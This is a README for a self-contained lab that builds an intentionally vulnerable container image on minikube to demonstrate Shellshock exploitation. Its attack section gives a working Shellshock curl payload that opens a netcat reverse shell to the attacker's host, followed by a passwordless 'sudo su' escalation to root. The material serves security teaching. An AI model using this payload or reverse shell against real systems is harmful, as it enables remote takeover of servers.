# Vulnerable Container Image :smiling_imp:

This is an example of an attack caused by a vulnerable container image.

## Requirements
- CPU Architecture
  - amd64
  - x86_64
  - arm64 (:warning: use the command marked `for arm64`)
- Tools
  - Docker
  - kubectl
  - minikube

## Vulnerability Description

- Bash with [CVE-2014-6271](https://security-tracker.debian.org/tracker/CVE-2014-6271)
- Unnecessary packages such as netcat and sudo
- Root privileges can be obtained without password
- a CGI script

## Setup

1. (Only for `arm64`) Set up for using `amd64` images

```bash
# create a new instance for using `amd64` images
> docker buildx create --use

# enable qemu-user-static for using `amd64` images
> minikube ssh "sudo apt-get update && sudo apt-get -y install qemu-user-static"
> minikube stop && minikube start
```

2. Build the vulnerable container image

```bash
> docker build -t vulnerable-container-image .

# for arm64
> docker build -t vulnerable-container-image . --platform=linux/amd64 --load
```

3. Build the web container image

```bash
> docker build -t web-container-image .

# for arm64
> docker build -t web-container-image . --platform=linux/amd64 --load
```

4. Apply k8s manifests

```bash
> kubectl apply -f manifest/pod.yaml
> kubectl apply -f manifest/service.yaml
```

5. Assign the external IP to the load balancer

```bash
> minikube tunnel
```


## Attack Scenario

1. Listen to the port 5050 on the host machine

   - Terminal 1

       ```bash
       > ncat -lvnp 5050
       ```
2. Execute the command to establish a connection to the host machine from the vulnerable container
       
   - Terminal 2

        ```bash
        > curl -H "User-Agent: () { :; }; /bin/nc -e /bin/bash ${TERMINAL_IP} 5050" http://${EXTERNAL_IP}:8080/cgi-bin/vulnerable-cgi
        ```

   - Log of Terminal 1

        ```bash
        
        Ncat: Version 7.95 ( https://nmap.org/ncat )
        Ncat: Listening on [::]:5050
        Ncat: Listening on 0.0.0.0:5050
        Ncat: Connection from xxx.xxx.xxx.xxx.
        whoami # input1
        www-data # output1
        sudo su # input2
        whoami # input3
        root # output3
        ```